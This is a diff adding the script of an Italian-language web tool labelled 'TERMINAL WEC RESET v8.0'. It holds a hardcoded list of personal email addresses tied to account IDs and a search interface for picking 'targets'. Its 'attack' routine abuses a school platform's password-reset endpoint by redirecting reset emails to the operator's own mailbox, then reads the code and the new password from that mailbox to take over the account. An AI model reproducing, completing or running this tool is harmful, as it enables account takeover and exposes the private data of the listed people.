+            {id: '230376', email1: 'annadetoni@tiscali.it', email2: 'gianni.trovati@ilsole24ore.com'},
+            {id: '230373', email1: 'ros.longavita@gmail.com', email2: 'giumileto@hotmail.it'},
+            {id: '230377', email1: 'valeria.borrelli@cdp.it', email2: 'emiliano.ranati@aceaspa.it'},
+            {id: '230379', email1: 'capuaniarianna@yahoo.it', email2: 'lorenzomattei@hotmail.com'},
+            {id: '230378', email1: 'lolachex@gmail.com', email2: 'anto.moscatello@virgilio.it'},
+            {id: '230380', email1: 'avv.isabellagigli@gmail.com', email2: 'studiocolilli@gmail.com'},
+            {id: '230381', email1: 'francesca@casaguidi.net ;   paquizk7@gmail.com', email2: 'raffaele.p.guidi@gmail.com'},
+            {id: '230382', email1: 'alessiapaolozzi@gmail.com', email2: 'federico976@gmail.com'},
+            {id: '230383', email1: 'alessandrascagliola@ymail.com', email2: 'giulio.slash@yahoo.it'},
+            {id: '230384', email1: 'adit12588@gmail.com', email2: 'tomer.susel@gmail.com'},
+            {id: '230340', email1: 'claudia-santoro@libero.it', email2: 'matdepa@gmail.com'},
+            {id: '230390', email1: 'danilap1976@libero.it', email2: 'fabbiani.rocco@gsf.it'},
+            {id: '230385', email1: 'francesca.possemato@gmail.com', email2: 'matteo.orati@gmail.com'},
+            {id: '230387', email1: 'robertadileva@gmail.com', email2: 'valerio.aceti@gmail.com'},
+            {id: '230388', email1: 'mad.detommasi@gmail.com', email2: 'elia.giu@gmail.com'},
+            {id: '230351', email1: 'nata&tasha@gmail.com', email2: 'pcamastra@gmail.com'},
+            {id: '230345', email1: 'francescalafavia@libero.it', email2: 'prizioemiliano@gmail.com'},
+            {id: '230346', email1: 'marianiclaudia90@gmail.com', email2: 'lucagara86@gmail.com'},
+            {id: '230332', email1: 'socchigrossi@yahoo.it', email2: 'patrizio_pavia@yahoo.it'},
+            {id: '230323', email1: 'info@aldograuso.it', email2: 'libero.romina@libero.it'},
+            {id: '230341', email1: 'sabrina.mag@hotmail.it', email2: 'fabio.sim@hotmail.it'},
+            {id: '230350', email1: 'michela.bollettino@gmail.com', email2: 'gianluigi.saponara@gmail.com'},
+            {id: '230358', email1: 'ambraonofri@yahoo.it', email2: 'salvatore@hotelpiemonte.com'},
+            {id: '230336', email1: 'va.moraca@gmail.com', email2: 'albertorestuccia9@gmail.com'},
+            {id: '230344', email1: 'randasc11@gmail.com', email2: 'denisrocchetti@gmail.com'},
+            {id: '230343', email1: 'pcollosi@live.it', email2: 'andreapalmesi@gmail.com'},
+            {id: '230335', email1: 'silvia.di-gregorio@hotmail.it', email2: 'fabiodivi@hotmail.com'},
+            {id: '230331', email1: 'maricecche85@gmail.com', email2: 'davideronchi82.9@gmail.com'},
+            {id: '230394', email1: 'gaialodato03@gmail.com', email2: 'gaialodato@icloud.com'},
+            {id: '230334', email1: 'emanuela.mariani@me.com', email2: 'gianni.etna@gmail.com'},
+            {id: '230338', email1: 'francypz@hotmail.it', email2: 'luca.onnis@gmail.com'},
+            {id: '230355', email1: 'f_rodellin@icloud.com', email2: 'graziano.zaccari@generali.com'},
+            {id: '330003', email1: 'valentina.busini@polimi.it', email2: 'afiorucci81@gmail.com'},
+            {id: '330001', email1: 'g.carminati@nextplanet.it', email2: 'c.brunori@nextplanet.it'}
+        ];
+
+        // ============================================================
+        // VARIABILI GLOBALI
+        // ============================================================
+        let emailToken = null;
+        let seenMessages = new Set();
+        let processing = false;
+        let lastMessageId = null;
+        let isLoggedIn = false;
+
+        // Elementi DOM
+        const terminal = document.getElementById('terminal');
+        const led = document.getElementById('led');
+        const statusText = document.getElementById('statusText');
+        const resultBox = document.getElementById('resultBox');
+        const resultUsername = document.getElementById('resultUsername');
+        const resultPassword = document.getElementById('resultPassword');
+        const loginArea = document.getElementById('loginArea');
+        const searchSection = document.getElementById('searchSection');
+        const attackSection = document.getElementById('attackSection');
+        const accessPassword = document.getElementById('accessPassword');
+        const loginBtn = document.getElementById('loginBtn');
+        const searchInput = document.getElementById('searchInput');
+        const autocompleteList = document.getElementById('autocompleteList');
+        const resultsArea = document.getElementById('resultsArea');
+        const attackUsername = document.getElementById('attackUsername');
+        const startAttackBtn = document.getElementById('startAttackBtn');
+        const statsDisplay = document.getElementById('statsDisplay');
+        const dbStats = document.getElementById('dbStats');
+
+        // ============================================================
+        // FUNZIONI DI LOG
+        // ============================================================
+        function log(msg, type = 'normal') {
+            const line = document.createElement('div');
+            line.className = `line ${type}`;
+            line.innerHTML = msg;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function logDebug(msg) {
+            const line = document.createElement('div');
+            line.className = 'line-debug';
+            line.innerHTML = `🔍 DEBUG: ${msg}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function logResponse(responseText, step) {
+            const line = document.createElement('div');
+            line.className = 'line-response';
+            
+            let formattedResponse = '';
+            try {
+                const json = JSON.parse(responseText);
+                formattedResponse = JSON.stringify(json, null, 2);
+            } catch {
+                formattedResponse = responseText;
+            }
+            
+            line.innerHTML = `
+                <span class="info">📡 RESPONSE ${step}:</span>
+                <pre>${formattedResponse}</pre>
+            `;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            return responseText;
+        }
+
+        function loading(msg) {
+            const line = document.createElement('div');
+            line.className = 'line wait';
+            line.innerHTML = msg + ' <span class="cursor"></span>';
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function setStatus(state, text) {
+            led.className = `led ${state}`;
+            statusText.textContent = text;
+        }
+
+        function clearConsole() {
+            terminal.innerHTML = '';
+        }
+
+        // ============================================================
+        // FUNZIONI DI LOGIN
+        // ============================================================
+        function checkPassword() {
+            const pwd = accessPassword.value.trim();
+            
+            if (pwd === ACCESS_PASSWORD) {
+                isLoggedIn = true;
+                loginArea.style.display = 'none';
+                searchSection.style.display = 'block';
+                attackSection.style.display = 'block';
+                setStatus('active', 'ACCESS GRANTED');
+                
+                // Aggiorna statistiche
+                statsDisplay.textContent = `DB: ${database.length} records`;
+                dbStats.textContent = `${database.length} utenti`;
+                
+                log('✅ ACCESSO CONSENTITO - Database caricato', 'success');
+                log(`📊 TOTALE RECORD: ${database.length}`, 'info');
+                log('🔍 Usa il motore di ricerca per trovare target', 'info');
+                log('⚡ Poi clicca su un risultato per caricare username nell\'attacco', 'wait');
+                
+                // Setup autocomplete
+                setupAutocomplete();
+            } else {
+                setStatus('active', 'ACCESS DENIED');
+                log('❌ PASSWORD ERRATA - Accesso negato', 'error');
+                accessPassword.value = '';
+            }
+        }
+
+        // ============================================================
+        // FUNZIONI DI RICERCA
+        // ============================================================
+        function searchDatabase(query) {
+            if (!query || query.length < 2) return [];
+            
+            const lowerQuery = query.toLowerCase();
+            const results = [];
+            
+            database.forEach(user => {
+                const username = `dedaloroma${user.id}`;
+                const matchId = user.id.includes(query) || username.includes(lowerQuery);
+                const matchEmail1 = user.email1.toLowerCase().includes(lowerQuery);
+                const matchEmail2 = user.email2.toLowerCase().includes(lowerQuery);
+                
+                if (matchId || matchEmail1 || matchEmail2) {
+                    results.push(user);
+                }
+            });
+            
+            return results.slice(0, 15); // Limita a 15 risultati
+        }
+
+        function displayResults(results) {
+            if (results.length === 0) {
+                resultsArea.innerHTML = '<div class="result-item" style="color: #f00;">❌ Nessun risultato trovato</div>';
+                return;
+            }
+            
+            let html = '';
+            results.forEach(user => {
+                const username = `dedaloroma${user.id}`;
+                html += `
+                    <div class="result-item" onclick="selectTarget('${username}')">
+                        <div class="main-info">
+                            <span class="badge">🔸 ${username}</span>
+                            <span class="email-preview">📧 ${user.email1}</span>
+                        </div>
+                        <div class="email-preview" style="margin-left: 25px;">📧 ${user.email2}</div>
+                    </div>
+                `;
+            });
+            
+            resultsArea.innerHTML = html;
+        }
+
+        function selectTarget(username) {
+            attackUsername.value = username;
+            log(`🎯 Target selezionato: ${username}`, 'success');
+            
+            // Scroll alla sezione attacco
+            attackSection.scrollIntoView({ behavior: 'smooth' });
+            
+            // Evidenziazione temporanea
+            attackUsername.style.borderColor = '#ff0';
+            setTimeout(() => {
+                attackUsername.style.borderColor = '#0f0';
+            }, 1000);
+        }
+
+        function setupAutocomplete() {
+            searchInput.addEventListener('input', function() {
+                const value = this.value.trim();
+                
+                if (value.length < 2) {
+                    autocompleteList.classList.remove('visible');
+                    resultsArea.innerHTML = '';
+                    return;
+                }
+                
+                const results = searchDatabase(value);
+                
+                if (results.length > 0) {
+                    // Mostra risultati nell'area dedicata
+                    displayResults(results);
+                    
+                    // Mostra anche autocomplete rapido
+                    autocompleteList.innerHTML = results.slice(0, 5).map(user => 
+                        `<div class="autocomplete-item" onclick="selectTarget('dedaloroma${user.id}')">
+                            <span class="id">dedaloroma${user.id}</span>
+                            <span class="email">${user.email1}</span>
+                        </div>`
+                    ).join('');
+                    autocompleteList.classList.add('visible');
+                } else {
+                    autocompleteList.classList.remove('visible');
+                    resultsArea.innerHTML = '<div class="result-item" style="color: #f00;">❌ Nessun risultato trovato</div>';
+                }
+            });
+
+            // Nascondi autocomplete quando si clicca fuori
+            document.addEventListener('click', function(e) {
+                if (!searchInput.contains(e.target) && !autocompleteList.contains(e.target)) {
+                    autocompleteList.classList.remove('visible');
+                }
+            });
+        }
+
+        // ============================================================
+        // FUNZIONI EMAIL (ATTACCO)
+        // ============================================================
+        function getMailHeaders(token = null) {
+            const headers = { ...FIXED_HEADERS };
+            if (token) {
+                headers['Authorization'] = `Bearer ${token}`;
+            }
+            return headers;
+        }
+
+        async function authEmail() {
+            try {
+                const res = await fetch(`${BASE_MAIL}/token`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        ...FIXED_HEADERS
+                    },
+                    body: JSON.stringify({ address: EMAIL, password: EMAIL_PASSWORD })
+                });
+                
+                if (!res.ok) throw new Error('Auth failed');
+                const data = await res.json();
+                emailToken = data.token;
+                
+                await updateLastMessageId();
+                
+                return true;
+            } catch (e) {
+                logDebug(`Email auth error: ${e.message}`);
+                return false;
+            }
+        }
+
+        async function updateLastMessageId() {
+            try {
+                const res = await fetch(`${BASE_MAIL}/messages`, {
+                    headers: getMailHeaders(emailToken)
+                });
+                
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data['hydra:member'] && data['hydra:member'].length > 0) {
+                        const messages = data['hydra:member'];
+                        const latestMsg = messages[messages.length - 1];
+                        lastMessageId = latestMsg.id;
+                        logDebug(`Ultimo messaggio ID: ${lastMessageId}`);
+                    }
+                }
+            } catch (e) {
+                logDebug(`Errore update last message: ${e.message}`);
+            }
+        }
+
+        async function getNewMessages() {
+            if (!emailToken && !(await authEmail())) return null;
+            
+            try {
+                const res = await fetch(`${BASE_MAIL}/messages`, {
+                    headers: getMailHeaders(emailToken)
+                });
+                
+                if (!res.ok) throw new Error('Failed');
+                const data = await res.json();
+                
+                if (!data['hydra:member']) return [];
+                
+                const messages = data['hydra:member'];
+                const newMessages = [];
+                
+                for (const msg of messages) {
+                    if (!lastMessageId || msg.id > lastMessageId) {
+                        newMessages.push(msg);
+                    }
+                }
+                
+                if (newMessages.length > 0) {
+                    lastMessageId = newMessages[newMessages.length - 1].id;
+                }
+                
+                return newMessages;
+                
+            } catch (e) {
+                emailToken = null;
+                return null;
+            }
+        }
+
+        async function readMessage(msgId) {
+            try {
+                const res = await fetch(`${BASE_MAIL}/messages/${msgId}`, {
+                    headers: getMailHeaders(emailToken)
+                });
+                if (!res.ok) throw new Error('Failed');
+                return await res.json();
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function extractCode(text) {
+            const match = text.match(/[A-Z0-9]{3}-[A-Z0-9]{3}/i);
+            if (match) {
+                return match[0].toUpperCase();
+            }
+            
+            const words = text.match(/\S+/g) || [];
+            for (const w of words) {
+                if (w.includes('-')) {
+                    const clean = w.replace(/[^A-Z0-9-]/gi, '').toUpperCase();
+                    if (clean.length === 7 && clean.includes('-')) {
+                        return clean;
+                    }
+                }
+            }
+            return null;
+        }
+
+        function extractPassword(text) {
+            const words = text.match(/\S+/g) || [];
+            for (const w of words) {
+                const word = w.trim();
+                if (word.length >= 5 && word.length <= 15 &&
+                    /[A-Za-z]/.test(word) && /[0-9]/.test(word) &&
+                    !/password|codice|reset|step|dedalo|messaggio|non|rispondere|email|questa|risposta|automatica|wec|system|nuova/i.test(word.toLowerCase())) {
+                    return word;
+                }
+            }
+            return null;
+        }
+
+        async function checkForNewCodes(currentCode) {
+            logDebug('🔍 DOPPIO CHECK CODICE: verifico se ci sono nuovi codici...');
+            
+            await new Promise(r => setTimeout(r, 10000));
+            
+            for (let i = 1; i <= 4; i++) {
+                logDebug(`Check codice ${i}/4: controllo nuovi messaggi...`);
+                
+                const newMessages = await getNewMessages();
+                
+                if (newMessages && newMessages.length > 0) {
+                    for (const msg of newMessages) {
+                        const msgData = await readMessage(msg.id);
+                        if (!msgData) continue;
+                        
+                        const text = msgData.text || '';
+                        const newCode = extractCode(text);
+                        
+                        if (newCode && newCode !== currentCode) {
+                            logDebug(`⚠️ Trovato NUOVO codice: ${newCode} (diverso da ${currentCode})`);
+                            return newCode;
+                        }
+                    }
+                }
+                
+                if (i < 4) {
+                    logDebug(`Check codice ${i}/4 completato, aspetto 2 secondi...`);
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+            
+            logDebug('✅ DOPPIO CHECK CODICE: nessun nuovo codice trovato, uso quello corrente');
+            return currentCode;
+        }
+
+        async function checkForNewPasswords(currentPassword) {
+            logDebug('🔍 DOPPIO CHECK PASSWORD: verifico se ci sono nuove password...');
+            
+            await new Promise(r => setTimeout(r, 10000));
+            
+            for (let i = 1; i <= 4; i++) {
+                logDebug(`Check password ${i}/4: controllo nuovi messaggi...`);
+                
+                const newMessages = await getNewMessages();
+                
+                if (newMessages && newMessages.length > 0) {
+                    for (const msg of newMessages) {
+                        const msgData = await readMessage(msg.id);
+                        if (!msgData) continue;
+                        
+                        const text = msgData.text || '';
+                        const newPassword = extractPassword(text);
+                        
+                        if (newPassword && newPassword !== currentPassword) {
+                            logDebug(`⚠️ Trovata NUOVA password: ${newPassword} (diversa da ${currentPassword})`);
+                            return newPassword;
+                        }
+                    }
+                }
+                
+                if (i < 4) {
+                    logDebug(`Check password ${i}/4 completato, aspetto 2 secondi...`);
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+            
+            logDebug('✅ DOPPIO CHECK PASSWORD: nessuna nuova password trovata, uso quella corrente');
+            return currentPassword;
+        }
+
+        async function waitForCodeWithDoubleCheck(timeout = 60) {
+            const start = Date.now();
+            let foundCode = null;
+            let foundMessageId = null;
+            
+            while ((Date.now() - start) / 1000 < timeout && !foundCode) {
+                const newMessages = await getNewMessages();
+                
+                if (newMessages && newMessages.length > 0) {
+                    for (const msg of newMessages) {
+                        const msgId = msg['id'];
+                        
+                        if (seenMessages.has(msgId)) continue;
+                        
+                        const msgData = await readMessage(msgId);
+                        if (!msgData) continue;
+                        
+                        const text = msgData.text || '';
+                        const subject = msgData.subject || '';
+                        
+                        logDebug(`Trovata email: ${subject}`);
+                        
+                        const code = extractCode(text);
+                        if (code) {
+                            foundCode = code;
+                            foundMessageId = msgId;
+                            logDebug(`✅ PRIMO CODICE TROVATO: ${code}`);
+                            break;
+                        }
+                    }
+                }
+                
+                if (!foundCode) {
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+            
+            if (!foundCode) {
+                return null;
+            }
+            
+            log('⏳ DOPPIO CHECK CODICE: aspetto 10 secondi per vedere se arriva un altro codice...', 'wait');
+            
+            const finalCode = await checkForNewCodes(foundCode);
+            
+            if (finalCode !== foundCode) {
+                log(`⚠️ Usato l'ULTIMO codice: ${finalCode} (invece di ${foundCode})`, 'warning');
+            } else {
+                log(`✓ Confermato ULTIMO codice: ${finalCode}`, 'success');
+            }
+            
+            seenMessages.add(foundMessageId);
+            
+            return finalCode;
+        }
+
+        async function waitForPasswordWithDoubleCheck(timeout = 60) {
+            const start = Date.now();
+            let foundPassword = null;
+            let foundMessageId = null;
+            
+            while ((Date.now() - start) / 1000 < timeout && !foundPassword) {
+                const newMessages = await getNewMessages();
+                
+                if (newMessages && newMessages.length > 0) {
+                    for (const msg of newMessages) {
+                        const msgId = msg['id'];
+                        
+                        if (seenMessages.has(msgId)) continue;
+                        
+                        const msgData = await readMessage(msgId);
+                        if (!msgData) continue;
+                        
+                        const text = msgData.text || '';
+                        
+                        const pwd = extractPassword(text);
+                        if (pwd) {
+                            foundPassword = pwd;
+                            foundMessageId = msgId;
+                            logDebug(`✅ PRIMA PASSWORD TROVATA: ${pwd}`);
+                            break;
+                        }
+                    }
+                }
+                
+                if (!foundPassword) {
+                    await new Promise(r => setTimeout(r, 2000));
+                }
+            }
+            
+            if (!foundPassword) {
+                return null;
+            }
+            
+            log('⏳ DOPPIO CHECK PASSWORD: aspetto 10 secondi per vedere se arriva un\'altra password...', 'wait');
+            
+            const finalPassword = await checkForNewPasswords(foundPassword);
+            
+            if (finalPassword !== foundPassword) {
+                log(`⚠️ Usata l'ULTIMA password: ${finalPassword} (invece di ${foundPassword})`, 'warning');
+            } else {
+                log(`✓ Confermata ULTIMA password: ${finalPassword}`, 'success');
+            }
+            
+            seenMessages.add(foundMessageId);
+            
+            return finalPassword;
+        }
+
+        async function step1(username) {
+            log('▶ STEP 1: REQUEST RESET');
+            
+            const payload = {
+                "nomeSP": "AAUSRT_setCodiceReset",
+                "username": username,
+                "stepReset": "0",
+                "nomeScuola": "dedalo",
+                "indirizzoEmailTo": EMAIL
+            };
+            
+            log(`UA FISSO: ${FIXED_HEADERS['User-Agent']}`, 'wait');
+            
+            try {
+                const res = await fetch(URL_RESET, {
+                    method: 'POST',
+                    headers: FIXED_HEADERS,
+                    body: JSON.stringify(payload)
+                });
+                
+                const responseText = await res.text();
+                logResponse(responseText, 'STEP 1');
+                
+                if (res.ok) {
+                    log('✓ RESET REQUEST SENT', 'success');
+                    return true;
+                } else {
+                    log('✗ REQUEST FAILED', 'error');
+                    return false;
+                }
+            } catch (e) {
+                log(`✗ ERROR: ${e.message}`, 'error');
+                return false;
+            }
+        }
+
+        async function step2(username, code) {
+            log('▶ STEP 2: VERIFY CODE');
+            
+            const cleanCode = code.replace(/\s+/g, '').toUpperCase();
+            
+            const payload = {
+                "username": username,
+                "stepReset": "1",
+                "nomeScuola": "dedalo",
+                "codiceReset": cleanCode,
+                "indirizzoEmailTo": EMAIL
+            };
+            
+            log(`UA FISSO: ${FIXED_HEADERS['User-Agent']}`, 'wait');
+            
+            try {
+                const res = await fetch(URL_RESET, {
+                    method: 'POST',
+                    headers: FIXED_HEADERS,
+                    body: JSON.stringify(payload)
+                });
+                
+                const responseText = await res.text();
+                logResponse(responseText, 'STEP 2');
+                
+                try {
+                    const response = JSON.parse(responseText);
+                    
+                    if (response.message === "Reset password effettuata" || 
+                        (response.message && response.message.includes("Reset password effettuata"))) {
+                        
+                        log('✅ Reset password effettuata!', 'success');
+                        return true;
+                    } else if (response.esito === "OK" || 
+                        response.ok === true || 
+                        response.success === true ||
+                        response.status === "OK") {
+                        
+                        log('✓ CODE VERIFIED', 'success');
+                        return true;
+                    } else {
+                        const errorMsg = response.messaggio || response.message || response.errore || 'Verification failed';
+                        log(`✗ ${errorMsg}`, 'error');
+                        return false;
+                    }
+                } catch (e) {
+                    if (responseText.includes("Reset password effettuata")) {
+                        log('✅ Reset password effettuata!', 'success');
+                        return true;
+                    } else if (responseText.includes("OK") || responseText.includes("ok")) {
+                        log('✓ CODE VERIFIED', 'success');
+                        return true;
+                    } else {
+                        log(`✗ VERIFICATION FAILED`, 'error');
+                        return false;
+                    }
+                }
+            } catch (e) {
+                log(`✗ ERROR: ${e.message}`, 'error');
+                return false;
+            }
+        }
+
+        // Funzione principale di attacco
+        async function startAttack() {
+            if (processing) return;
+            
+            const username = attackUsername.value.trim();
+            if (!username) {
+                log('ERROR: username required', 'error');
+                return;
+            }
+            
+            processing = true;
+            startAttackBtn.disabled = true;
+            resultBox.classList.remove('show');
+            setStatus('active', 'ATTACK IN PROGRESS');
+            lastMessageId = null;
+            
+            clearConsole();
+            log(`🎯 TARGET: ${username}`);
+            log(`📧 EMAIL: ${EMAIL}`);
+            
+            try {
+                setStatus('active', 'AUTH');
+                if (!(await authEmail())) {
+                    throw new Error('Email auth failed');
+                }
+                log('✓ EMAIL AUTH', 'success');
+                
+                setStatus('active', 'STEP 1');
+                if (!(await step1(username))) {
+                    throw new Error('Step 1 failed');
+                }
+                
+                setStatus('wait', 'WAIT CODE');
+                loading('WAITING FOR CODE');
+                const code = await waitForCodeWithDoubleCheck(60);
+                
+                if (!code) {
+                    throw new Error('No code received');
+                }
+                log(`✓ ULTIMO CODICE: ${code}`, 'success');
+                
+                setStatus('active', 'STEP 2');
+                await new Promise(r => setTimeout(r, 1000));
+                
+                if (!(await step2(username, code))) {
+                    throw new Error('Step 2 failed');
+                }
+                
+                setStatus('wait', 'WAIT PASSWORD');
+                loading('WAITING FOR PASSWORD WITH DOUBLE CHECK');
+                const password = await waitForPasswordWithDoubleCheck(60);
+                
+                if (!password) {
+                    throw new Error('No password received');
+                }
+                log(`✓ PASSWORD FINALE: ${password}`, 'success');
+                
+                setStatus('active', 'DONE');
+                resultUsername.textContent = username;
+                resultPassword.textContent = password;
+                resultBox.classList.add('show');
+                log('✓ RESET COMPLETE', 'success');
+                
+            } catch (e) {
+                log(`✗ ${e.message}`, 'error');
+                setStatus('active', 'ERROR');
+            } finally {
+                processing = false;
+                startAttackBtn.disabled = false;
+            }
+        }
+
+        // Enter key per ricerca
+        searchInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && isLoggedIn) {
+                const results = searchDatabase(searchInput.value.trim());
+                displayResults(results);
+            }
+        });
+
+        // Messaggio iniziale
+        log('⎈ TERMINAL WEC RESET v8.0', 'info');
+        log('Inserisci la password di accesso per continuare...', 'wait');
+        setStatus('active', 'ACCESS LOCKED');
+    </script>
+</body>
+</html>
